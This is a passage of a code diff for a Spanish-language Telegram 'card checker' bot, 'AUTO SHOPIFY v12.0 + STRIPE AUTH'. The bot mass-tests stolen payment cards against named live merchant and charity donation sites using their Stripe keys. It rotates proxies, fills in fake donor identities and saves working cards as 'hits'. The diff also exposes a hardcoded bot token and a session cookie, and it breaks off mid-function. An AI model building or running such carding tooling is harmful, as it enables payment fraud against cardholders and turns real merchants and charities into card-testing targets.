@@ -1,2932 +1,5503 @@
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""
-Bot de Telegram para verificar tarjetas - VERSIÓN COMPLETA
-Con Shopify + GiveWP + STRIPE AUTO HITTER (con progreso y límite de intentos)
-"""
+# AUTO SHOPIFY v12.0 + STRIPE AUTH (PARALLEL PIPELINE)
+# OTP = DECLINE - SITIOS APROBADOS GUARDADOS PERMANENTEMENTE
 
-import os
+import requests
 import json
-import logging
-import asyncio
+import re
 import time
 import random
-import sqlite3
-import re
+import os
+import socket
+import urllib3
+import threading
 import base64
-import urllib.parse
-from typing import Dict, List, Tuple, Optional, Any
 from datetime import datetime
-from dataclasses import dataclass, field
-from enum import Enum
-import signal
-import sys
-
-from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
+from io import BytesIO
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import logging
+import sqlite3
+from typing import Dict, List
+from queue import Queue
+from bs4 import BeautifulSoup
 import aiohttp
+import asyncio
+import uuid
+import string
+from fake_useragent import UserAgent
 
-# ================== CONFIGURACIÓN DE LOGGING ==================
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Configure logging - SILENT MODE
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
+    level=logging.ERROR
 )
 logger = logging.getLogger(__name__)
 
-# ================== MANEJO DE SEÑALES ==================
-def handle_shutdown(signum, frame):
-    logger.info(f"🛑 Recibida señal {signum}, cerrando gracefulmente...")
-    sys.exit(0)
+# ============================================
+# BOT CONFIGURATION
+# ============================================
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8503937259:AAEApOgsbu34qw5J6OKz1dxgvRzrFv9IQdE")
+bot = telebot.TeleBot(BOT_TOKEN)
 
-signal.signal(signal.SIGTERM, handle_shutdown)
-signal.signal(signal.SIGINT, handle_shutdown)
+# Public bot - no owner restriction
 
-# ================== CONFIGURACIÓN ==================
-class Settings:
-    """Configuración global del bot"""
-    TOKEN = os.environ.get("BOT_TOKEN")
-    if not TOKEN:
-        raise ValueError("❌ ERROR: BOT_TOKEN no está configurado")
+# Data directory (Railway volume or local)
+DATA_DIR = os.environ.get("DATA_DIR", ".")
+os.makedirs(DATA_DIR, exist_ok=True)
 
-    API_ENDPOINTS = [
-        os.environ.get("API_URL", "https://auto-shopify-api-production.up.railway.app/index.php"),
-        os.environ.get("API_URL2", "https://auto-shopify-api-production.up.railway.app/index.php"),
-        os.environ.get("API_URL3", "https://auto-shopify-api-production.up.railway.app/index.php"),
-    ]
+# Data files
+SITES_FILE = os.path.join(DATA_DIR, "sites.json")
+PROXIES_FILE = os.path.join(DATA_DIR, "proxies.json")
+CARDS_FILE = os.path.join(DATA_DIR, "cards.json")
+HITS_FILE = os.path.join(DATA_DIR, "hits.json")
+PERMANENT_SITES_FILE = os.path.join(DATA_DIR, "permanent_sites.json")
+STRIPE_CARDS_FILE = os.path.join(DATA_DIR, "stripe_cards.json")
+STRIPE_HITS_FILE = os.path.join(DATA_DIR, "stripe_hits.json")
+SC_CARDS_FILE = os.path.join(DATA_DIR, "sc_cards.json")
+SC_HITS_FILE = os.path.join(DATA_DIR, "sc_hits.json")
+B3_CARDS_FILE = os.path.join(DATA_DIR, "b3_cards.json")
+B3_HITS_FILE = os.path.join(DATA_DIR, "b3_hits.json")
+API_URL = os.environ.get("API_URL", "http://108.165.12.183:8081")
+MAX_CARDS_PER_BATCH = 999999
 
-    DB_FILE = os.environ.get("DB_FILE", "bot_database.db")
-    MAX_WORKERS_PER_USER = int(os.environ.get("MAX_WORKERS", 8))
-    RATE_LIMIT_SECONDS = int(os.environ.get("RATE_LIMIT", 2))
-    DAILY_LIMIT_CHECKS = int(os.environ.get("DAILY_LIMIT", 1000))
-    MASS_LIMIT_PER_HOUR = int(os.environ.get("MASS_LIMIT", 3))
-    MASS_COOLDOWN_MINUTES = 0  # SIN COOLDOWN
-    ADMIN_IDS = [int(id) for id in os.environ.get("ADMIN_IDS", "").split(",") if id]
+# Concurrency settings
+DEFAULT_MAX_WORKERS = 3
+REQUEST_TIMEOUT = 25
+PROXY_CHECK_TIMEOUT = 3
+CACHE_BIN_RESULTS = True
 
-    # Configuración de timeouts
-    TIMEOUT_CONFIG = {
-        "connect": 10,
-        "sock_connect": 10,
-        "sock_read": 60,
-        "total": None,
-        "response_body": 60,    
-        "bin_lookup": 2,
-    }
+# DELAY ENTRE CHECKS
+DELAY_BETWEEN_CHECKS = 5
 
-    # Stripe Hitting
-    STRIPE_HIT_DELAY = (1, 3)  # Delay aleatorio entre 1-3 segundos
-    STRIPE_AUTH_AMOUNT = 0.1   # $0.1 para autorización
-    STRIPE_CARD_TIMEOUT = 30    # Timeout por tarjeta en segundos
-    DEFAULT_HIT_LIMIT = 5       # Límite de intentos por defecto
+# Selectable modes
+current_mode = "extremo"
+mode_workers = {
+    "seguro": 1,
+    "rapido": 3,
+    "extremo": 5
+}
+PARALLEL_WORKERS = mode_workers[current_mode]
+STRIPE_AUTH_WORKERS = 3
+SC_PARALLEL_WORKERS = 1
+B3_PARALLEL_WORKERS = 1
 
-    # Cookie de sesión GiveWP
-    GIVEWP_SESSION_COOKIE = "_mwp_templates_session_id=d3006e4f268f308359cb0b1f2deeba36c19961447cfb3b686d075f145bbe963b; __cf_bm=ql.06QngxLGWXpotjCgJ55McvKs7UURClo4CG8QmquY-1771952389-1.0.1.1-JXnh6OmstNvxZrNfJQCHYLUi0sWvh.2Pz7odsE17s7tuePaJzGI408PfBdPkVbVKMnslXizQGYgHqtMy3hiLsr41cX2o2_iuOQQhMtKHFv8; cookieyes-consent=consentid:VUZuS2R1MnNXUktFdW1DQ0dCeEt0TjRBa1JKbEpJelg,consent:,action:,necessary:,functional:,analytics:,performance:,advertisement:,other:"
+# Update cada 5 cards
+UPDATE_BATCH_SIZE = 5
 
-# ================== INSTANCE ID ==================
-INSTANCE_ID = os.environ.get("RAILWAY_DEPLOYMENT_ID", str(time.time()))
+# Proxy checker settings
+PROXY_CHECK_WORKERS = 50
+PROXY_SOCKET_TIMEOUT = 2
 
-# ================== ENUMS ==================
-class CheckStatus(Enum):
-    # Éxito real
-    CHARGED = "charged"
-    LIVE = "live"  # Para Stripe
+# Rate limit settings
+BATCH_SIZE = 10
+BATCH_DELAY = 5
+last_batch_time = 0
+pending_approved = []
+batch_lock = threading.Lock()
+
+# Global variables
+current_max_workers = DEFAULT_MAX_WORKERS
+silent_pc_running = False
+silent_pc_thread = None
+SILENT_PC_INTERVAL = 7200
+
+# Mass check variables
+mass_check_running = False
+stripe_mass_running = False
+mass_paused = False
+current_mass_msg = None
+current_mass_chat_id = None
+stop_mass_flag = False
+
+# Cache
+stored_results = {}
+bin_cache = {}
+bin_cache_expiry = 3600
+hits_list = []
+stripe_hits_list = []
+sc_hits_list = []
+b3_hits_list = []
+last_dead_proxies = []
+pending_file_cards = {}
+
+# Connection pooling - reusable HTTP session
+http_session = requests.Session()
+http_adapter = requests.adapters.HTTPAdapter(
+    pool_connections=10,
+    pool_maxsize=20,
+    max_retries=requests.adapters.Retry(total=2, backoff_factor=0.3)
+)
+http_session.mount('http://', http_adapter)
+http_session.mount('https://', http_adapter)
+
+# Proxy auto-rotation
+failed_proxies = {}
+PROXY_FAIL_THRESHOLD = 3
+PROXY_FAIL_COOLDOWN = 300
+
+# Site performance tracking
+site_stats = {}
+SITE_AUTO_CLEAN_INTERVAL = 50
+site_check_counter = 0
+SITE_MIN_CHECKS = 5
+SITE_FAIL_RATE_THRESHOLD = 0.85
+
+# Stripe Auth sites
+STRIPE_SITES = [
+    "https://prontoheat.com",
+    "https://deveneys.ie"
+]
+
+# Stripe Charge $10 configuration (GiveWP + Stripe Elements)
+SC_SITE_URL = "https://ashevillecreativearts.org"
+SC_DONATION_PAGE = f"{SC_SITE_URL}/get-involved/donate-to-our-partner-organizations/donate-to-cine-casual/"
+SC_AJAX_URL = f"{SC_SITE_URL}/wp-admin/admin-ajax.php"
+SC_STRIPE_PK = "pk_live_SMtnnvlq4TpJelMdklNha8iD"
+SC_STRIPE_ACCT = "acct_1H46cvJLC1CnQZhf"
+SC_FORM_ID = "2976"
+SC_FORM_TITLE = "Donate Form - Cine Casual"
+SC_DONATE_AMOUNT = "10.00"
+SC_FIRST_NAMES = ["James","Mary","John","Patricia","Robert","Jennifer","Michael","Linda",
+                   "David","Elizabeth","William","Barbara","Richard","Susan","Joseph","Jessica",
+                   "Thomas","Sarah","Charles","Karen","Daniel","Lisa","Mark","Nancy"]
+SC_LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
+                  "Rodriguez","Martinez","Wilson","Anderson","Taylor","Thomas","Moore","Jackson"]
+SC_ADDRESSES = [
+    {"line1": "236 W 30TH", "city": "NEW YORK", "state": "NY", "zip": "10001"},
+    {"line1": "100 BROADWAY", "city": "NEW YORK", "state": "NY", "zip": "10005"},
+    {"line1": "742 EVERGREEN TER", "city": "SPRINGFIELD", "state": "IL", "zip": "62704"},
+    {"line1": "123 MAIN ST", "city": "LOS ANGELES", "state": "CA", "zip": "90001"},
+    {"line1": "456 OAK AVE", "city": "CHICAGO", "state": "IL", "zip": "60601"},
+    {"line1": "789 PINE RD", "city": "HOUSTON", "state": "TX", "zip": "77001"},
+    {"line1": "321 ELM ST", "city": "PHOENIX", "state": "AZ", "zip": "85001"},
+    {"line1": "654 MAPLE DR", "city": "MIAMI", "state": "FL", "zip": "33101"},
+]
+sc_mass_running = False
+sc_form_hash = None
+sc_http_session = None
+b3_mass_running = False
+b3_auth_fp = None
+b3_apm_nonce = None
+b3_config_data = None
+b3_http_session = None
+b3_session_pool = []
+B3_POOL_SIZE = 2
+B3_RATE_LIMIT_DELAY = 22
+
+# ============================================
+# COUNTRY FLAGS
+# ============================================
+
+COUNTRY_FLAGS = {
+    'AF': '🇦🇫', 'AL': '🇦🇱', 'DZ': '🇩🇿', 'AD': '🇦🇩', 'AO': '🇦🇴', 'AG': '🇦🇬', 'AR': '🇦🇷', 'AM': '🇦🇲',
+    'AU': '🇦🇺', 'AT': '🇦🇹', 'AZ': '🇦🇿', 'BS': '🇧🇸', 'BH': '🇧🇭', 'BD': '🇧🇩', 'BB': '🇧🇧', 'BY': '🇧🇾',
+    'BE': '🇧🇪', 'BZ': '🇧🇿', 'BJ': '🇧🇯', 'BT': '🇧🇹', 'BO': '🇧🇴', 'BA': '🇧🇦', 'BW': '🇧🇼', 'BR': '🇧🇷',
+    'BN': '🇧🇳', 'BG': '🇧🇬', 'BF': '🇧🇫', 'BI': '🇧🇮', 'KH': '🇰🇭', 'CM': '🇨🇲', 'CA': '🇨🇦', 'CV': '🇨🇻',
+    'CF': '🇨🇫', 'TD': '🇹🇩', 'CL': '🇨🇱', 'CN': '🇨🇳', 'CO': '🇨🇴', 'KM': '🇰🇲', 'CG': '🇨🇬', 'CD': '🇨🇩',
+    'CR': '🇨🇷', 'CI': '🇨🇮', 'HR': '🇭🇷', 'CU': '🇨🇺', 'CY': '🇨🇾', 'CZ': '🇨🇿', 'DK': '🇩🇰', 'DJ': '🇩🇯',
+    'DM': '🇩🇲', 'DO': '🇩🇴', 'EC': '🇪🇨', 'EG': '🇪🇬', 'SV': '🇸🇻', 'GQ': '🇬🇶', 'ER': '🇪🇷', 'EE': '🇪🇪',
+    'ET': '🇪🇹', 'FJ': '🇫🇯', 'FI': '🇫🇮', 'FR': '🇫🇷', 'GA': '🇬🇦', 'GM': '🇬🇲', 'GE': '🇬🇪', 'DE': '🇩🇪',
+    'GH': '🇬🇭', 'GR': '🇬🇷', 'GD': '🇬🇩', 'GT': '🇬🇹', 'GN': '🇬🇳', 'GW': '🇬🇼', 'GY': '🇬🇾', 'HT': '🇭🇹',
+    'HN': '🇭🇳', 'HU': '🇭🇺', 'IS': '🇮🇸', 'IN': '🇮🇳', 'ID': '🇮🇩', 'IR': '🇮🇷', 'IQ': '🇮🇶', 'IE': '🇮🇪',
+    'IL': '🇮🇱', 'IT': '🇮🇹', 'JM': '🇯🇲', 'JP': '🇯🇵', 'JO': '🇯🇴', 'KZ': '🇰🇿', 'KE': '🇰🇪', 'KI': '🇰🇮',
+    'KP': '🇰🇵', 'KR': '🇰🇷', 'KW': '🇰🇼', 'KG': '🇰🇬', 'LA': '🇱🇦', 'LV': '🇱🇻', 'LB': '🇱🇧', 'LS': '🇱🇸',
+    'LR': '🇱🇷', 'LY': '🇱🇾', 'LI': '🇱🇮', 'LT': '🇱🇹', 'LU': '🇱🇺', 'MK': '🇲🇰', 'MG': '🇲🇬', 'MW': '🇲🇼',
+    'MY': '🇲🇾', 'MV': '🇲🇻', 'ML': '🇲🇱', 'MT': '🇲🇹', 'MH': '🇲🇭', 'MR': '🇲🇷', 'MU': '🇲🇺', 'MX': '🇲🇽',
+    'FM': '🇫🇲', 'MD': '🇲🇩', 'MC': '🇲🇨', 'MN': '🇲🇳', 'ME': '🇲🇪', 'MA': '🇲🇦', 'MZ': '🇲🇿', 'MM': '🇲🇲',
+    'NA': '🇳🇦', 'NR': '🇳🇷', 'NP': '🇳🇵', 'NL': '🇳🇱', 'NZ': '🇳🇿', 'NI': '🇳🇮', 'NE': '🇳🇪', 'NG': '🇳🇬',
+    'NO': '🇳🇴', 'OM': '🇴🇲', 'PK': '🇵🇰', 'PW': '🇵🇼', 'PS': '🇵🇸', 'PA': '🇵🇦', 'PG': '🇵🇬', 'PY': '🇵🇾',
+    'PE': '🇵🇪', 'PH': '🇵🇭', 'PL': '🇵🇱', 'PT': '🇵🇹', 'QA': '🇶🇦', 'RO': '🇷🇴', 'RU': '🇷🇺', 'RW': '🇷🇼',
+    'KN': '🇰🇳', 'LC': '🇱🇨', 'VC': '🇻🇨', 'WS': '🇼🇸', 'SM': '🇸🇲', 'ST': '🇸🇹', 'SA': '🇸🇦', 'SN': '🇸🇳',
+    'RS': '🇷🇸', 'SC': '🇸🇨', 'SL': '🇸🇱', 'SG': '🇸🇬', 'SK': '🇸🇰', 'SI': '🇸🇮', 'SB': '🇸🇧', 'SO': '🇸🇴',
+    'ZA': '🇿🇦', 'SS': '🇸🇸', 'ES': '🇪🇸', 'LK': '🇱🇰', 'SD': '🇸🇩', 'SR': '🇸🇷', 'SZ': '🇸🇿', 'SE': '🇸🇪',
+    'CH': '🇨🇭', 'SY': '🇸🇾', 'TW': '🇹🇼', 'TJ': '🇹🇯', 'TZ': '🇹🇿', 'TH': '🇹🇭', 'TL': '🇹🇱', 'TG': '🇹🇬',
+    'TO': '🇹🇴', 'TT': '🇹🇹', 'TN': '🇹🇳', 'TR': '🇹🇷', 'TM': '🇹🇲', 'TV': '🇹🇻', 'UG': '🇺🇬', 'UA': '🇺🇦',
+    'AE': '🇦🇪', 'GB': '🇬🇧', 'US': '🇺🇸', 'UY': '🇺🇾', 'UZ': '🇺🇿', 'VU': '🇻🇺', 'VA': '🇻🇦', 'VE': '🇻🇪',
+    'VN': '🇻🇳', 'YE': '🇾🇪', 'ZM': '🇿🇲', 'ZW': '🇿🇼'
+}
+
+# ============================================
+# SQLITE DATABASE CLASS
+# ============================================
+
+class SQLiteBackup:
+    def __init__(self, db_path: str = None):
+        self.db_path = db_path or os.path.join(DATA_DIR, "shopify_bot_backup.db")
+        self.conn = None
+        self.setup_database()
     
-    # Bloqueos / Autenticación
-    CAPTCHA_REQUIRED = "captcha_required"
-    THREE_DS_REQUIRED = "3ds_required"
-    WAF_BLOCK = "waf_block"
-    RATE_LIMIT = "rate_limit"
-    BLOCKED = "blocked"
+    def get_connection(self):
+        if self.conn is None:
+            self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
+            self.conn.row_factory = sqlite3.Row
+        return self.conn
     
-    # Declinados
-    DECLINED = "declined"
-    INSUFFICIENT_FUNDS = "insufficient_funds"
-    CARD_ERROR = "card_error"
-    EXPIRED = "expired"
-    FRAUDULENT = "fraudulent"
-    
-    # Errores de red
-    CONNECT_TIMEOUT = "connect_timeout"
-    READ_TIMEOUT = "read_timeout"
-    SITE_DOWN = "site_down"
-    
-    # Respuesta ambigua
-    UNKNOWN = "unknown"
-
-class Confidence(Enum):
-    HIGH = "HIGH"
-    MEDIUM = "MEDIUM"
-    LOW = "LOW"
-    CONFIRMED = "CONFIRMED"
-
-# ================== DATACLASSES ==================
-@dataclass
-class Job:
-    site: str
-    proxy: str
-    card_data: Dict
-    job_id: int
-    created_at: datetime = field(default_factory=datetime.now)
-
-@dataclass
-class JobResult:
-    job: Job
-    status: CheckStatus
-    confidence: Confidence
-    reason: str
-    response_time: float
-    http_code: Optional[int]
-    response_text: str
-    success: bool
-    bin_info: Dict = field(default_factory=dict)
-    price: str = "N/A"
-    patterns_detected: List[str] = field(default_factory=list)
-
-@dataclass
-class StripeHitResult:
-    """Resultado específico para Stripe Hitter"""
-    card_last4: str
-    bin: str
-    status: str
-    reason: str
-    response_time: float
-    fraud_score: Optional[str] = None
-    three_ds: bool = False
-
-# ================== CLASIFICADOR DE RESPUESTAS ==================
-class ResponseClassifier:
-    """Clasifica respuestas según patrones"""
-    
-    SUCCESS_PATTERNS = {
-        "thank_you": re.compile(r'thank\s*you|thanks', re.I),
-        "order_confirmed": re.compile(r'order\s*confirmed|order\s*#\d+', re.I),
-        "receipt": re.compile(r'receipt|invoice', re.I),
-        "payment_complete": re.compile(r'payment\s*complete|transaction\s*complete', re.I),
-        "success": re.compile(r'success|successful', re.I),
-        "donation_received": re.compile(r'donation.*received|thank.*for.*donation', re.I),
-    }
-    
-    DECLINE_PATTERNS = {
-        "insufficient_funds": re.compile(r'insufficient\s*funds|insufficient.*balance', re.I),
-        "declined": re.compile(r'declined|rejected|denied', re.I),
-        "card_error": re.compile(r'card.*error|invalid.*card', re.I),
-        "expired": re.compile(r'expired\s*card|card.*expired', re.I),
-    }
-    
-    BLOCK_PATTERNS = {
-        "captcha": re.compile(r'captcha|recaptcha|challenge', re.I),
-        "3ds": re.compile(r'3ds|3d\s*secure|verified.*visa|securecode', re.I),
-        "rate_limit": re.compile(r'rate\s*limit|too\s*many|429', re.I),
-        "waf": re.compile(r'waf|cloudflare|firewall', re.I),
-        "blocked": re.compile(r'blocked|access.*denied|forbidden', re.I),
-    }
-    
-    @classmethod
-    def classify(cls, text: str, http_code: Optional[int] = None, response_time: float = 0) -> Tuple[CheckStatus, Confidence, str, List[str]]:
-        patterns = []
+    def setup_database(self):
+        conn = self.get_connection()
+        cursor = conn.cursor()
         
-        # Errores HTTP
-        if http_code:
-            if http_code == 429:
-                return CheckStatus.RATE_LIMIT, Confidence.HIGH, "rate_limit", ["http_429"]
-            elif http_code == 403:
-                return CheckStatus.BLOCKED, Confidence.HIGH, "access_denied", ["http_403"]
-            elif http_code == 401:
-                return CheckStatus.BLOCKED, Confidence.HIGH, "unauthorized", ["http_401"]
-            elif http_code >= 500:
-                return CheckStatus.SITE_DOWN, Confidence.HIGH, f"server_error_{http_code}", [f"http_{http_code}"]
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS hits_backup (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                cc TEXT NOT NULL,
+                month TEXT NOT NULL,
+                year TEXT NOT NULL,
+                cvv TEXT NOT NULL,
+                category TEXT NOT NULL,
+                status_msg TEXT,
+                response_msg TEXT,
+                gateway TEXT,
+                price TEXT,
+                elapsed REAL,
+                bin_info TEXT,
+                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        """)
         
-        text_lower = text.lower()
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS stripe_hits_backup (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                cc TEXT NOT NULL,
+                month TEXT NOT NULL,
+                year TEXT NOT NULL,
+                cvv TEXT NOT NULL,
+                category TEXT NOT NULL,
+                status_msg TEXT,
+                response_msg TEXT,
+                gateway TEXT,
+                price TEXT,
+                elapsed REAL,
+                bin_info TEXT,
+                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        """)
         
-        # Buscar bloqueos (primero, son más específicos)
-        for block, pattern in cls.BLOCK_PATTERNS.items():
-            if pattern.search(text_lower):
-                patterns.append(f"block:{block}")
-                if block == "captcha":
-                    return CheckStatus.CAPTCHA_REQUIRED, Confidence.HIGH, "captcha_detected", patterns
-                elif block == "3ds":
-                    return CheckStatus.THREE_DS_REQUIRED, Confidence.HIGH, "3ds_required", patterns
-                elif block in ["blocked", "waf"]:
-                    return CheckStatus.BLOCKED, Confidence.HIGH, f"{block}_detected", patterns
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS stats_daily (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                date TEXT UNIQUE NOT NULL,
+                total_checks INTEGER DEFAULT 0,
+                total_approved INTEGER DEFAULT 0,
+                total_declined INTEGER DEFAULT 0,
+                total_errors INTEGER DEFAULT 0,
+                stripe_checks INTEGER DEFAULT 0,
+                stripe_approved INTEGER DEFAULT 0,
+                mode_used TEXT DEFAULT 'fast'
+            )
+        """)
         
-        # Buscar declines
-        for decline, pattern in cls.DECLINE_PATTERNS.items():
-            if pattern.search(text_lower):
-                patterns.append(f"decline:{decline}")
-                if decline == "insufficient_funds":
-                    return CheckStatus.INSUFFICIENT_FUNDS, Confidence.HIGH, "insufficient_funds", patterns
-                else:
-                    return CheckStatus.DECLINED, Confidence.HIGH, "payment_declined", patterns
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS permanent_sites (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                url TEXT UNIQUE NOT NULL,
+                success_count INTEGER DEFAULT 1,
+                first_success TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                last_success TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        """)
         
-        # Buscar éxito
-        for success, pattern in cls.SUCCESS_PATTERNS.items():
-            if pattern.search(text_lower):
-                patterns.append(f"success:{success}")
-                return CheckStatus.CHARGED, Confidence.HIGH, "payment_successful", patterns
+        cursor.execute("CREATE INDEX IF NOT EXISTS idx_hits_timestamp ON hits_backup(timestamp)")
+        cursor.execute("CREATE INDEX IF NOT EXISTS idx_hits_category ON hits_backup(category)")
+        cursor.execute("CREATE INDEX IF NOT EXISTS idx_hits_cc ON hits_backup(cc)")
+        cursor.execute("CREATE INDEX IF NOT EXISTS idx_stripe_hits_timestamp ON stripe_hits_backup(timestamp)")
+        cursor.execute("CREATE INDEX IF NOT EXISTS idx_stripe_hits_category ON stripe_hits_backup(category)")
+        cursor.execute("CREATE INDEX IF NOT EXISTS idx_permanent_sites_url ON permanent_sites(url)")
+        cursor.execute("CREATE INDEX IF NOT EXISTS idx_stats_daily_date ON stats_daily(date)")
         
-        # Si no hay patrones claros
-        if len(text) > 100:
-            return CheckStatus.UNKNOWN, Confidence.LOW, "unrecognized_response", ["has_content"]
+        conn.commit()
+    
+    def save_hit_backup(self, hit_data: Dict, gateway: str = "shopify"):
+        conn = self.get_connection()
+        cursor = conn.cursor()
         
-        return CheckStatus.UNKNOWN, Confidence.LOW, "no_patterns", ["empty_response"]
+        if gateway == "stripe_auth":
+            table = "stripe_hits_backup"
+        else:
+            table = "hits_backup"
+        
+        cursor.execute(f"""
+            INSERT INTO {table} (cc, month, year, cvv, category, status_msg, 
+                           response_msg, gateway, price, elapsed, bin_info)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        """, (
+            hit_data.get('cc', ''), hit_data.get('month', ''), 
+            hit_data.get('year', ''), hit_data.get('cvv', ''),
+            hit_data.get('category', ''), hit_data.get('status_msg', ''), 
+            hit_data.get('response_msg', ''),
+            hit_data.get('gateway', ''), hit_data.get('price', '$0.95'),
+            hit_data.get('elapsed', 0), json.dumps(hit_data.get('bin_info', {}))
+        ))
+        
+        conn.commit()
+    
+    def update_daily_stats(self, total_checks: int, approved: int, declined: int, errors: int, 
+                           stripe_checks: int = 0, stripe_approved: int = 0,
+                           mode: str = "fast"):
+        conn = self.get_connection()
+        cursor = conn.cursor()
+        today = datetime.now().strftime('%Y-%m-%d')
+        cursor.execute("""
+            INSERT INTO stats_daily (date, total_checks, total_approved, total_declined, total_errors, 
+                                     stripe_checks, stripe_approved, mode_used)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+            ON CONFLICT(date) DO UPDATE SET
+                total_checks = total_checks + excluded.total_checks,
+                total_approved = total_approved + excluded.total_approved,
+                total_declined = total_declined + excluded.total_declined,
+                total_errors = total_errors + excluded.total_errors,
+                stripe_checks = stripe_checks + excluded.stripe_checks,
+                stripe_approved = stripe_approved + excluded.stripe_approved,
+                mode_used = excluded.mode_used
+        """, (today, total_checks, approved, declined, errors, stripe_checks, stripe_approved, mode))
+        conn.commit()
+    
+    def add_permanent_site(self, url: str):
+        conn = self.get_connection()
+        cursor = conn.cursor()
+        cursor.execute("""
+            INSERT INTO permanent_sites (url, success_count, last_success)
+            VALUES (?, 1, CURRENT_TIMESTAMP)
+            ON CONFLICT(url) DO UPDATE SET
+                success_count = success_count + 1,
+                last_success = CURRENT_TIMESTAMP
+        """, (url,))
+        conn.commit()
+    
+    def is_permanent_site(self, url: str) -> bool:
+        conn = self.get_connection()
+        cursor = conn.cursor()
+        cursor.execute("SELECT 1 FROM permanent_sites WHERE url = ?", (url,))
+        return cursor.fetchone() is not None
+    
+    def get_permanent_sites(self) -> List[Dict]:
+        conn = self.get_connection()
+        cursor = conn.cursor()
+        cursor.execute("SELECT url, success_count, first_success, last_success FROM permanent_sites ORDER BY success_count DESC")
+        return [dict(row) for row in cursor.fetchall()]
+    
+    def get_today_stats(self) -> Dict:
+        conn = self.get_connection()
+        cursor = conn.cursor()
+        today = datetime.now().strftime('%Y-%m-%d')
+        cursor.execute("SELECT * FROM stats_daily WHERE date = ?", (today,))
+        row = cursor.fetchone()
+        if row:
+            return dict(row)
+        return {"total_checks": 0, "total_approved": 0, "total_declined": 0, "total_errors": 0, 
+                "stripe_checks": 0, "stripe_approved": 0, "mode_used": "fast"}
 
-# ================== FUNCIONES AUXILIARES ==================
-def get_status_emoji(status: CheckStatus) -> str:
-    emoji_map = {
-        CheckStatus.CHARGED: "✅",
-        CheckStatus.LIVE: "✅",
-        CheckStatus.CAPTCHA_REQUIRED: "🤖",
-        CheckStatus.THREE_DS_REQUIRED: "🔒",
-        CheckStatus.WAF_BLOCK: "🛡️",
-        CheckStatus.RATE_LIMIT: "⏳",
-        CheckStatus.BLOCKED: "🚫",
-        CheckStatus.DECLINED: "❌",
-        CheckStatus.INSUFFICIENT_FUNDS: "💸",
-        CheckStatus.CARD_ERROR: "❌",
-        CheckStatus.EXPIRED: "⌛",
-        CheckStatus.FRAUDULENT: "🚨",
-        CheckStatus.CONNECT_TIMEOUT: "⏱️",
-        CheckStatus.READ_TIMEOUT: "⏱️",
-        CheckStatus.SITE_DOWN: "🌐",
-        CheckStatus.UNKNOWN: "❓",
-    }
-    return emoji_map.get(status, "❓")
+sqlite_backup = SQLiteBackup()
 
-def get_status_text(status: CheckStatus) -> str:
-    """Retorna texto legible para el estado"""
-    text_map = {
-        CheckStatus.LIVE: "LIVE",
-        CheckStatus.CHARGED: "CHARGED",
-        CheckStatus.THREE_DS_REQUIRED: "3DS",
-        CheckStatus.FRAUDULENT: "FRAUDULENT",
-        CheckStatus.DECLINED: "DECLINED",
-        CheckStatus.INSUFFICIENT_FUNDS: "INSUFFICIENT_FUNDS",
-        CheckStatus.CARD_ERROR: "CARD_ERROR",
-        CheckStatus.EXPIRED: "EXPIRED",
-    }
-    return text_map.get(status, status.value.upper())
+# ============================================
+# STRIPE AUTH FUNCTIONS (CON TIEMPO REAL CORREGIDO)
+# ============================================
 
-def get_confidence_icon(confidence: Confidence) -> str:
-    icon_map = {
-        Confidence.HIGH: "🔴",
-        Confidence.MEDIUM: "🟡",
-        Confidence.LOW: "🟢",
-        Confidence.CONFIRMED: "🔴",
-    }
-    return icon_map.get(confidence, "⚪")
+def generate_random_email():
+    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
+    number = random.randint(100, 9999)
+    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
+    return f"{username}{number}@{random.choice(domains)}"
 
-def format_time(seconds: float) -> str:
-    minutes = int(seconds // 60)
-    secs = int(seconds % 60)
-    if minutes > 0:
-        return f"{minutes}m {secs}s"
-    return f"{secs}s"
+def generate_guid():
+    return str(uuid.uuid4())
 
-def extract_price(text: str) -> str:
+def gets(s, start, end):
     try:
-        patterns = [
-            r'\$?(\d+\.\d{2})',
-            r'amount["\s:]+(\d+\.\d{2})',
-            r'total["\s:]+(\d+\.\d{2})',
-            r'value=["\'](\d+\.\d{2})["\']',
-        ]
-        for pattern in patterns:
-            match = re.search(pattern, text, re.I)
-            if match:
-                return f"${match.group(1)}"
+        start_index = s.index(start) + len(start)
+        end_index = s.index(end, start_index)
+        return s[start_index:end_index]
+    except (ValueError, AttributeError):
+        return None
+
+def normalize_url_stripe(url):
+    url = url.strip()
+    if not url.startswith(('http://', 'https://')):
+        url = 'https://' + url
+    url = url.rstrip('/')
+    if '/my-account' not in url.lower():
+        url += '/my-account'
+    if not url.endswith('/'):
+        url += '/'
+    return url
+
+def get_random_stripe_site():
+    return random.choice(STRIPE_SITES)
+
+async def check_stripe_auth_async(cc, month, year, cvv, site_url, start_time):
+    """Stripe Auth Gateway - GRATIS (solo validación) - Con tiempo real desde el inicio"""
+    ua = UserAgent()
+    
+    card_data = {
+        'number': cc,
+        'exp_month': month,
